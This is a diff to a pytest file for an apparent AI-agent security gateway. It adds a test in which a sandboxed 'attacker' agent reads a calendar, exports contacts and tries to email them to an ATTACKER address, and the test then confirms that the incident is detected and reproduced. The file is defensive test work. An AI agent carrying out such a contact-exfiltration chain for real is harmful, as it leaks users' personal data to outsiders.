@@ -1,5 +1,7 @@
 """Engine API: the SDK data plane and the operator control plane, over HTTP."""
 
+import time
+
 import pytest
 from fastapi.testclient import TestClient
 
@@ -99,3 +101,27 @@ def test_events_feed_and_openapi(api):
     last = api.get("/events").json()[-1]["seq"]
     assert api.get(f"/events?after={last}").json() == []
     assert "/gateway/check" in api.get("/openapi.json").json()["paths"]
+
+
+def test_detonate_route_runs_the_sandbox(api):
+    gate.agents["meeting_assistant"].entrypoint = "tests.sandbox_agents:attacker"
+    run_id, auth = start(api)
+    d = check(api, run_id, auth, "read_calendar", date="2026-10-11").json()
+    api.post(f"/runs/{run_id}/tool-results", headers=auth, json={
+        "call_id": d["call_id"], "tool": "read_calendar", "result": {"events": []}})
+    d = check(api, run_id, auth, "export_contacts").json()
+    api.post(f"/runs/{run_id}/tool-results", headers=auth, json={
+        "call_id": d["call_id"], "tool": "export_contacts",
+        "result": {"count": 1, "csv": "c1,a@contoso.example"}})
+    check(api, run_id, auth, "send_email", to=ATTACKER, subject="x", body="rows")  # freeze
+
+    incident_id = api.get("/incidents").json()[0]["id"]
+    assert api.post(f"/incidents/{incident_id}/detonate?runs=1").json()["detonation_id"]
+    assert api.post(f"/incidents/{incident_id}/detonate").status_code == 409  # already running
+    for _ in range(100):
+        incident = api.get(f"/incidents/{incident_id}").json()
+        if incident["status"] != "detonating":
+            break
+        time.sleep(0.1)
+    assert incident["status"] == "confirmed" and incident["next_action"] == "find_cause"
+    assert incident["verdict"]["compromised_runs"] == "1/1"
